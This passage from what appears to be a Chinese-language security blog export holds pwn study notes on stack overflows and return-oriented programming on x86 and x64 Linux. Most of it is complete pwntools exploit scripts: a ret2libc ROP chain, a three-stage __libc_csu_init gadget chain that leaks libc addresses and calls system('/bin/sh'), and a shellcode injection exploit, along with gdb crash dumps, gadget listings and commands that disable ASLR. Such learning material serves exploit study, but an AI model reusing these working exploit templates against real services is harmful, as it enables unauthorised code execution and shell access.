RSI: 0x7fffffffdc10 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n&quot;)
RDI: 0x0 
RBP: 0x6c41415041416b41 (&apos;AkAAPAAl&apos;)
RSP: 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
RIP: 0x4005e7 (&lt;vulnerable_function+32&gt;:    ret)
R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
R10: 0x37b 
R11: 0x246 
R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7fffffffdd90 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005e0 &lt;vulnerable_function+25&gt;:    call   0x400490 &lt;read@plt&gt;
   0x4005e5 &lt;vulnerable_function+30&gt;:    nop
   0x4005e6 &lt;vulnerable_function+31&gt;:    leave  
=&gt; 0x4005e7 &lt;vulnerable_function+32&gt;:    ret    
   0x4005e8 &lt;main&gt;:    push   rbp
   0x4005e9 &lt;main+1&gt;:    mov    rbp,rsp
   0x4005ec &lt;main+4&gt;:    sub    rsp,0x10
   0x4005f0 &lt;main+8&gt;:    mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc98 (&quot;AAQAAmAARAAoAA\n&quot;)
0008| 0x7fffffffdca0 --&gt; 0xa41416f414152 (&apos;RAAoAA\n&apos;)
0016| 0x7fffffffdca8 --&gt; 0x100000000 
0024| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
0032| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0040| 0x7fffffffdcc0 --&gt; 0x0 
0048| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe172 (&quot;/home/heyuan/桌面/test3&quot;)
0056| 0x7fffffffdcd0 --&gt; 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005e7 in vulnerable_function ()
</code></pre><p>PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。就是因为我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。</p>
<pre><code>gdb-peda$ x/gx $rsp
0x7fffffffdc98:    0x41416d4141514141
</code></pre><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p>
<pre><code>gdb-peda$ pattern offset 0x41416d4141514141
4702159612987654465 found at offset: 136
</code></pre><p>可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针。</p>
<pre><code>$ python -c &apos;print &quot;A&quot;*136+&quot;ABCDEF\x00\x00&quot;&apos; &gt; payload

gdb-peda$ r &lt; payload 
Starting program: /home/heyuan/桌面/test3 &lt; payload
Hello, World

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
RAX: 0x91 
RBX: 0x0 
RCX: 0x7ffff7b04680 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)
RDX: 0x200 
RSI: 0x7fffffffdc10 (&apos;A&apos; &lt;repeats 137 times&gt;, &quot;BCDEF&quot;)
RDI: 0x0 
RBP: 0x4141414141414141 (&apos;AAAAAAAA&apos;)
RSP: 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
RIP: 0x464544434241 (&apos;ABCDEF&apos;)
R8 : 0x400690 (&lt;__libc_csu_fini&gt;:    repz ret)
R9 : 0x7ffff7de78e0 (&lt;_dl_fini&gt;:    push   rbp)
R10: 0x37b 
R11: 0x246 
R12: 0x4004c0 (&lt;_start&gt;:    xor    ebp,ebp)
R13: 0x7fffffffdd90 --&gt; 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x464544434241
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdca0 --&gt; 0x7fffffffdd0a --&gt; 0xe550000000000000 
0008| 0x7fffffffdca8 --&gt; 0x100000000 
0016| 0x7fffffffdcb0 --&gt; 0x400620 (&lt;__libc_csu_init&gt;:    push   r15)
0024| 0x7fffffffdcb8 --&gt; 0x7ffff7a2e830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0032| 0x7fffffffdcc0 --&gt; 0x0 
0040| 0x7fffffffdcc8 --&gt; 0x7fffffffdd98 --&gt; 0x7fffffffe171 (&quot;/home/heyuan/桌面/test3&quot;)
0048| 0x7fffffffdcd0 --&gt; 0x100000000 
0056| 0x7fffffffdcd8 --&gt; 0x4005e8 (&lt;main&gt;:    push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000464544434241 in ?? ()
</code></pre><p>可以看到我们已经成功的控制了PC的指针了。所以最终的exp如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

elf = ELF(&apos;level3&apos;)

p = process(&apos;./level3&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

callsystem = 0x0000000000400584

payload = &quot;A&quot;*136 + p64(callsystem)

p.send(payload)

p.interactive()
</code></pre><h2 id="使用工具寻找gadgets"><a href="#使用工具寻找gadgets" class="headerlink" title="使用工具寻找gadgets"></a>使用工具寻找gadgets</h2><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。所以我们需要寻找一些类似于 pop rdi; ret 的这种gadget。如果是简单的gadgets，我们可以通过objdump来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些查找gadgets的工具比较方便。比较有名的工具有：</p>
<pre><code>ROPEME: https://github.com/packz/ropeme
Ropper: https://github.com/sashs/Ropper
ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
rp++: https://github.com/0vercl0k/rp
</code></pre><p>这些工具大致功能都差不多，下面结合例子讲一下，程序源码如下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dlfcn.h&gt;
void systemaddr()
{
    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);
    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));
    fflush(stdout);
}
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    systemaddr();
    write(1, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>编译：</p>
<pre><code>gcc -fno-stack-protector test4.c -o test4 -ldl
</code></pre><p>首先目标程序会打印system()在内存中的地址，这样的话就不需要我们考虑ASLR的问题了，只需要想办法触发buffer overflow然后利用ROP执行 system(“/bin/sh”) 。但为了调用 system(“/bin/sh”) ，我们需要找到一个gadget将rdi的值指向“/bin/sh”的地址。于是我们使用ROPGadget搜索一下test4中所有pop ret的gadgets。</p>
<pre><code>$ ROPgadget --binary test4 --only &quot;pop|ret&quot; 
Gadgets information
============================================================
0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008b0 : pop r14 ; pop r15 ; ret
0x00000000004008b2 : pop r15 ; ret
0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop rbp ; ret
0x00000000004008b3 : pop rdi ; ret
0x00000000004008b1 : pop rsi ; pop r15 ; ret
0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400601 : ret
0x0000000000400682 : ret 0x2009
</code></pre><p>我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)
</code></pre><p>另外，因为我们只需调用一次system()函数就可以获取shell，所以我们也可以搜索不带ret的gadgets来构造ROP链。</p>
<pre><code>ROPgadget --binary libc.so --only &quot;pop|call&quot; | grep rdi
0x0000000000195eab : call qword ptr [rdi + rbp*2 - 0x745c0000]
0x000000000019a1e3 : call qword ptr [rdi + rbx + 2]
0x000000000007d8b0 : call qword ptr [rdi]
0x0000000000023e56 : call rdi
0x0000000000106829 : pop rax ; pop rdi ; call rax
0x000000000010682a : pop rdi ; call rax
</code></pre><p>通过搜索结果我们发现，0x0000000000106829 : pop rax ; pop rdi ; call rax也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p>
<pre><code>payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)
</code></pre><p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)

p = process(&apos;./test4&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

binsh_addr_offset = next(libc.search(&apos;/bin/sh&apos;)) -libc.symbols[&apos;system&apos;]
print &quot;binsh_addr_offset = &quot; + hex(binsh_addr_offset)

#pop_ret_offset = 0x0000000000022a12 - libc.symbols[&apos;system&apos;]
#print &quot;pop_ret_offset = &quot; + hex(pop_ret_offset)

pop_pop_call_offset = 0x0000000000106829 - libc.symbols[&apos;system&apos;]
print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)

print &quot;\n##########receiving system addr##########\n&quot;
system_addr_str = p.recvuntil(&apos;\n&apos;)
system_addr = int(system_addr_str,16)
print &quot;system_addr = &quot; + hex(system_addr)

binsh_addr = system_addr + binsh_addr_offset
print &quot;binsh_addr = &quot; + hex(binsh_addr)


#pop_ret_addr = system_addr + pop_ret_offset
#print &quot;pop_ret_addr = &quot; + hex(pop_ret_addr)

pop_pop_call_addr = system_addr + pop_pop_call_offset
print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)

p.recv()

#payload = &quot;\x00&quot;*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 

payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) 

print &quot;\n##########sending payload##########\n&quot;
p.send(payload)

p.interactive()
</code></pre><p>运行结果如下：</p>
<pre><code>python test4.py 
[*] &apos;/home/heyuan/\xe6\xa1\x8c\xe9\x9d\xa2/libc.so&apos;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process &apos;./test4&apos;: Done
binsh_addr_offset = 0x146de7
pop_pop_call_offset = 0xc1499

##########receiving system addr##########

system_addr = 0x7f17c39f1390
binsh_addr = 0x7f17c3b38177
pop_pop_call_addr = 0x7f17c3ab2829

##########sending payload##########

[*] Switching to interactive mode
$ id
uid=1000(heyuan) gid=1000(heyuan) 组=1000(heyuan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(wireshark)
</code></pre><h2 id="通用gadgets"><a href="#通用gadgets" class="headerlink" title="通用gadgets"></a>通用gadgets</h2><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p>
<p>目标程序test5.c源码如下：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
    vulnerable_function();
}
</code></pre><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./test<br>5观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p>
<pre><code>00000000004005a0 &lt;__libc_csu_init&gt;:
  4005a0:   48 89 6c 24 d8          mov    %rbp,-0x28(%rsp)
  4005a5:   4c 89 64 24 e0          mov    %r12,-0x20(%rsp)
  4005aa:   48 8d 2d 73 08 20 00    lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;
  4005b1:   4c 8d 25 6c 08 20 00    lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;
  4005b8:   4c 89 6c 24 e8          mov    %r13,-0x18(%rsp)
  4005bd:   4c 89 74 24 f0          mov    %r14,-0x10(%rsp)
  4005c2:   4c 89 7c 24 f8          mov    %r15,-0x8(%rsp)
  4005c7:   48 89 5c 24 d0          mov    %rbx,-0x30(%rsp)
  4005cc:   48 83 ec 38             sub    $0x38,%rsp
  4005d0:   4c 29 e5                sub    %r12,%rbp
  4005d3:   41 89 fd                mov    %edi,%r13d
  4005d6:   49 89 f6                mov    %rsi,%r14
  4005d9:   48 c1 fd 03             sar    $0x3,%rbp
  4005dd:   49 89 d7                mov    %rdx,%r15
  4005e0:   e8 1b fe ff ff          callq  400400 &lt;_init&gt;
  4005e5:   48 85 ed                test   %rbp,%rbp
  4005e8:   74 1c                   je     400606 &lt;__libc_csu_init+0x66&gt;
  4005ea:   31 db                   xor    %ebx,%ebx
  4005ec:   0f 1f 40 00             nopl   0x0(%rax)
  4005f0:   4c 89 fa                mov    %r15,%rdx
  4005f3:   4c 89 f6                mov    %r14,%rsi
  4005f6:   44 89 ef                mov    %r13d,%edi
  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)
  4005fd:   48 83 c3 01             add    $0x1,%rbx
  400601:   48 39 eb                cmp    %rbp,%rbx
  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;
  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx
  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp
  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12
  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13
  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14
  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15
  400624:   48 83 c4 38             add    $0x38,%rsp
  400628:   c3                      retq   
</code></pre><p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p>
<p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  &quot;\x00&quot;*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += &quot;\x00&quot;*56
payload1 += p64(main)
</code></pre><p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  &quot;\x00&quot;*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += &quot;\x00&quot;*56
payload2 += p64(main)
</code></pre><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
payload3 =  &quot;\x00&quot;*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += &quot;\x00&quot;*56
payload3 += p64(main)
</code></pre><p>最终exp如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

elf = ELF(&apos;level5&apos;)
libc = ELF(&apos;libc.so.6&apos;)

p = process(&apos;./level5&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

got_write = elf.got[&apos;write&apos;]
print &quot;got_write: &quot; + hex(got_write)
got_read = elf.got[&apos;read&apos;]
print &quot;got_read: &quot; + hex(got_read)

main = 0x400564

off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]
print &quot;off_system_addr: &quot; + hex(off_system_addr)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  &quot;\x00&quot;*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += &quot;\x00&quot;*56
payload1 += p64(main)

p.recvuntil(&quot;Hello, World\n&quot;)

print &quot;\n#############sending payload1#############\n&quot;
p.send(payload1)
sleep(1)

write_addr = u64(p.recv(8))
print &quot;write_addr: &quot; + hex(write_addr)

system_addr = write_addr - off_system_addr
print &quot;system_addr: &quot; + hex(system_addr)

bss_addr=0x601028

p.recvuntil(&quot;Hello, World\n&quot;)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  &quot;\x00&quot;*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += &quot;\x00&quot;*56
payload2 += p64(main)

print &quot;\n#############sending payload2#############\n&quot;
p.send(payload2)
sleep(1)

p.send(p64(system_addr))
p.send(&quot;/bin/sh\0&quot;)
sleep(1)

p.recvuntil(&quot;Hello, World\n&quot;)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
payload3 =  &quot;\x00&quot;*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += &quot;\x00&quot;*56
payload3 += p64(main)

print &quot;\n#############sending payload3#############\n&quot;

sleep(1)
p.send(payload3)
</code></pre>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn学习rop之x86篇</title>
    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0rop%E4%B9%8Bx86%E7%AF%87/</url>
    <content><![CDATA[<p>这段时间自学了蒸米大神写的一步一步学rop系列，以下都是我的学习心得。。。<br><a id="more"></a></p>
<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>在说ROP之前，先来说一下什么是缓冲区溢出漏洞。缓冲区溢出漏洞（buffer overflow）是当今软件系统最主要的安全漏洞，利用缓冲区溢出漏洞的攻击也是攻击者最常用的攻击方式之一。所谓缓冲区溢出，是指在应用程序或者系统程序的内存中写入超长数据，从而达到恶意改变或者控制程序执行流程的目的。攻击者通过缓冲区溢出把shellcode写入程序的内存空间，并且通过覆盖栈上函数的返回地址，即EIP寄存器所指向的内存地址的值，或者覆盖SEH链表来实现程序执行流程的控制，使得植入内存的shellcode得以执行。</p>
<p>栈溢出（stack-based buffer overflows）算是安全界常见的漏洞。一方面因为程序员的疏忽，使用了 strcpy、sprintf等不安全的函数，增加了栈溢出漏洞的可能。另一方面，因为栈上保存了函数的返回地址等信息，因此如果攻击者能任意覆盖栈上的数据，通常情况下就意味着他能修改程序的执行流程，从而造成更大的破坏。</p>
<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</p>
<p>所谓ROP，简单的说就是把原来已经存在的代码块拼接起来，拼接的方式是通过一个预先准备好的特殊的返回栈，里面包含了各条指令结束后下一条指令的地址。</p>
<p>在一般程序里面，都包含着大量的返回指令（ret），他们基本位于函数的尾部，或是函数中部需要返回的地方。而从函数开始的地方到ret指令之间的这一段序列称为二进制指令代码块（gadgets）。这些二进制指令序列使其组合成完成一些诸如读写内存、算术逻辑运算、控制流程跳转、函数调用等操作。于是，我们就可以通过利用内存空间中各个gadgets以某种顺序执行，达到进行任意操作的目的。而为了使各个gadgets“拼接”起来，我们就需要构造一个特殊的返回栈。首先让指向我们构造的栈（stack）的指针跳到gadget A中，执行其中的代码序列后ret回我们的stack中，然后下一步是跳到gadget B，执行后就到gadgets C……只要stack足够大，就能达到我们想要的效果。</p>
<h2 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h2><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。（详细了解可以去看我的另一篇博客<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">checksec及其包含的保护机制</a>）我们这些初学的菜鸟先一步一步来，之后再加上各种防御措施，接着再学习绕过方法，所谓循序渐进嘛。。。</p>
<p>首先来看看我们要用的简单的缓冲区溢出例子：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
}
</code></pre><p>注意这个例子需要在32位的liunx系统下编译，学64位的时候在64位系统下编译。我们使用如下命令编译它：</p>
<pre><code>gcc -fno-stack-protector -z execstack -o test1 test.    
</code></pre><p>这个命令编译程序。-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector。同时我们在shell中执行：</p>
<pre><code>sudo -s 
echo 0 &gt; /proc/sys/kernel/randomize_va_space
exit
</code></pre><p>这几个指令。执行完后我们就关掉整个linux系统的ASLR保护。</p>
<p>接下来我们开始对目标程序进行分析。首先我们先来确定溢出点的位置，这里我推荐使用gdb插件peda自带的pattern这个脚本来进行计算。我们使用如下命令：</p>
<p><img src="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png" alt=""></p>
<p>之后使用gdb调试</p>
<p><img src="http://p1.bqimg.com/567571/5134a5b537aa2d73.png" alt=""><br>这里我们可以得到内存出错地址为0x41416d41.之后使用命令：</p>
<p><img src="http://p1.bpimg.com/567571/fadaebd3da23a2e0.png" alt=""></p>
<p>就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个”A”*140+ret字符串，就可以让pc执行ret地址上的代码了。</p>
<p>之后就是生成一段shellcode可以在网上找现成的，也可以使用msf生成。作为一个初学者，shellcode的地址并不好找，因为gdb调试的时候会影响buf在内存中的地址，蒸米大神推介了一个好的方法：</p>
<p>开去core dump 这个功能。</p>
<pre><code>ulimit -c unlimited
sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;
</code></pre><p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
<p><img src="http://p1.bqimg.com/567571/dc30b05d3c9ad4ba.png" alt=""></p>
<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xfff66bfd。</p>
<p>OK，现在溢出点，shellcode和返回值地址都有了，可以开始写exp了。</p>
<p>最终本地测试代码如下：</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./test&apos;) 
ret =0xfff66bfd 

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) 
#对ret进行编码，将地址转换成内存中的二进制存储形式
payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)

p.send(payload) #发送payload

p.interactive()  #开启交互shell
</code></pre><p>接下来我们把这个目标程序作为一个服务绑定到服务器的某个端口上，这里我们可以使用socat这个工具来完成，命令如下：</p>
<pre><code>socat TCP4-LISTEN:10001,fork EXEC:./level1
</code></pre><p>随后这个程序的IO就被重定向到10001这个端口上了，并且可以使用 nc 127.0.0.1 10001来访问我们的目标程序服务了。</p>
<p>因为现在目标程序是跑在socat的环境中，exp脚本除了要把p = process(‘./level1’)换成p = remote(‘127.0.0.1’,10001) 之外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址。然后我们就可以使用exp进行远程溢出啦！</p>
<h2 id="0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护"><a href="#0x02-Ret2libc-–-Bypass-DEP-通过ret2libc绕过DEP防护" class="headerlink" title="0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护"></a>0x02 Ret2libc – Bypass DEP 通过ret2libc绕过DEP防护</h2><p>现在我们把DEP打开，依然关闭stack protector和ASLR。编译方法如下：</p>
<pre><code>gcc -fno-stack-protector -o test2 test.c
</code></pre><p>我们知道test2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
<pre><code>$ gdb ./test2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
….
(gdb) break main
Breakpoint 1 at 0x8048430
(gdb) run
Starting program: /home/mzheng/CTF/groupstudy/test/test2 

Breakpoint 1, 0x08048430 in main ()
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
(gdb) print __libc_start_main
$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdb如果安装有peda插件貌似这跳命令找不到)
0xb7f81ff8
warning: Unable to access target memory at 0xb7fc8500, halting search.
1 pattern found.
(gdb) x/s 0xb7f81ff8
0xb7f81ff8:  &quot;/bin/sh&quot;
